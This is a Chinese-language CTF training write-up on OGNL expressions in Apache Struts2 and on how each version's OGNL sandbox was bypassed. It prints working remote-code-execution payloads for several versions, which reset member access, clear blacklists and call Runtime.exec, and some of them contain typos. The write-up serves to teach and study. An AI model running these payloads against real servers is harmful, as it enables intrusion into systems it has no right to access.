文章截图来自山石网科安全研究院CTF冬令营技术分享

0x00、OGNL与Struts2の结合

OGNL概述：

功能概述：

 1. 存取对象的任意属性，简单而言即是对javabean进行操作；

 2. 调用对象方法；

 3. 调用类的静态方法；

 4. 索引数组元素；

 5. 操作集合。

OGNL表达式使用格式：

Ognl.getValue(expression, context, root);


expression：ognl表达式，值取自后面两个参数；

context：ognl的上下文，类型为map；

root：ognl的根，可以为javabean、list、map……

关于符号使用：

ognl表达式主要是配合strust2标签库使用，主要有#、%、$

#的用法：

 1. 用来访问非根元素，实际上相当于ActionContext.getContext()，例如：#session.msg表达式相当于ActionContext().getContext().getSession().getAttribute("msg")

 2. 用于过滤和投影集合，如persons.{?#this.age>20}

 3. 用来构造Map，例如：#{'foo1':'bar1', 'foo2':'bar2'}

%的用法：

在标志的属性为字符串类型时，计算OGNL表达式的值。即是标记%{}里的内容为真正的OGNL表达式来执行。

$的用法：

 1. 在国际化的资源中，引用OGNL表达式；

 2. 在Strust2配置文件中，引用OGNL表达式，如：

    <action name='AddPhoto' class="addPhoto">
    	<interceptor-ref name="fileUploadStack"/>
    	<result type="redict">ListPhotos.action?albumld=${albumld}</result>
    </action>
    

    OGNL中的上下文即struts2中的actionContext

    OGNL中的root即struts2中的valueStack

    获取ValueStack值栈的方式：

     1. 从request里获取

        HttpServletRequest = ServletActionContext.getRequest();
        ValueStack vs = (ValueStack)request.getAttribute("struts valueStack");
        

     2. 获取ActionContext对象，取出requestMap()

        ActionContext context = ActionContext.getContext();
        Map<String, Object> requestAttribute = (Map<String, Object>)context.get("request");
        ValueStack vs2 = (ValueStack)requestAttribute.get("struts valueStack");
        

     3. 使用ActionContext对象方法，直接获得ValueStack对象引用

        ActionContext.getContext.getValueStack();  // 常用
        ActionContext.getContext.get("VALUE_STACK");
        

0x01、OGNL执行过程

OGNL的包是位于xwork2中的,而连通Struts2与xwork2的桥梁就是ActionProxy，也就是说在ActionProxy接管整个控制权前,FilterDispatcher就已经完成了对ActionContext的建立与初始化。
而具体的代码是在org.apache.struts2.dispatcher.PrepareOperations中:

注意到调用栈中首先是初始化了ValueStack之后再通过OgnlUtil这个API将数据和方法注入进ValueStack中，而ValueStack又是利用OgnlContext来创建的，所以会看到OgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。
如果利用OgnlUtil更改了设置项(excludedClasses、excludedPackageNames、excludedPackageNamePatterns)则同样会更改_memberAccess中的值。
总结也就是与OgnlContext中的memberAccess建立关系，即创建了memberAccess而这一点在沙箱绕过时起到了很重要的作用。

0x02、OGNL沙箱绕过分析

各个版本的绕过分析

Struts 2.3.14.1 版本之前

常见的通用poc为：

(#_memberAccess['allowStaticMethodAccess'] = true).(@java.lang.Runtime@getRuntime().exec('calc'))


在更新到2.3.14.1版本之前，OGNL的使用基本属于不设防状态。

修复的关键在于SecurityMemberAccess。

在2.3.14.1版本后将allowStaticMethodAccess设置为final属性后，不能显式更改，由此poc也失效了。

Struts 2.3.20 版本前

在2.3.14.1和更新的版本，alloStatucMethodAccess已经没有用了并且没法再修改。

但是，依然可以通过memberAccess使用类的构造函数并且访问公共函数，因此该条件下存在一种替代poc：

(#p = new java.lang.ProcessBuilder('xcalc')).(#p.start)


在2.3.20后，Struts 2不仅引入了黑名单（excludedClasses、excludedPackageNames和excludedPackageNamePatterns），而且组织了所有构造函数的使用，导致不能使用ProcessBuilder这个payload。

Struts 2.3.29 版本前

在2.3.29版本前，没有静态方法，没有构造函数，但是允许直接访问类，还有静态对象DefaultMemberAccess可以访问。

在程序运行时，setOgnlUtil方法将黑名单等数据赋给SecurityMemberAccess，这就是创建memberAccess的过程，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，整个建立关系的过程就相当于是继承父类并重写父类的过程。

换句话说，DefalutMemberAccess是还没添加黑名单的静态对象，所以此处我们利用其父类DefaultMemberAccess覆盖memberAccess中的内容，初始化memberAccess，来达到绕过黑名单限制的效果。

poc:
(#_memberAcess = @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('xcalc'))


Struts 2.3.30/2.5.2+

到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路:

(#container = #context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil = #container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class).(#ognlUtil.excludedClasses.clear()).
(#ognlUtil.excludedPackageNames.clear()).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))


绕过的关键点在于：

  * 利用OGNL执行流程中，container获取了OgnlUtil实例。

  * 清空了OgnlUtil$excludedClasses黑名单，释放了DefaultMemberAccess。

  * 利用setMemberAccess覆盖。

但这个poc还是不能运行，原因是excludedClasses也不可变了，没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空，继续修改poc。

poc:
(#context=#attr[ 'struts.valueStack'].context).
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class).(#ognlUtil.setExcludedClasses('')).(#ognIUtil.setExcludedPackageNames('')).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec( 'xcalc'))



  * 2.5.13版本后禁止访问context.map

context这个全局变量就不能再使用了，所以第一步是寻找context的替代方案
绕过思路:没有办法使用context.map，但可以调用attr,attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map
所以修改前面的poc:

poc:
(#context=#attr['struts.valueStack'].context).
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnIUtil@class)).(#ognlUtil.excludedClasses.clear()).
(#ognlUtil.excludedPackageNames.clear()).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))
